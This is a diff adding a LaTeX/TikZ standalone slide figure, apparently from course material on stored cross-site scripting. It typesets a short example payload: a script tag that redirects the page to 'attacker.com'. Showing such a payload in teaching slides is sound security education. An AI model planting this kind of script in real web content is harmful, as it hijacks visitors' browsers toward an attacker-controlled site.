@@ -1,0 +1,16 @@
+\documentclass[tikz]{standalone}
+\input{common/tikzBase}
+\usetikzlibrary{}
+\newsavebox{\storedXssComment}
+\begin{document}
+\begin{lrbox}{\storedXssComment}
+\begin{lstlisting}[language={}]
+<script>
+    document.location = 'http://attacker.com';
+</script>
+\end{lstlisting}
+\end{lrbox}
+
+\setSlide{1}
+\input{web/texfig/storedXSS.inner.tex}
+\end{document}
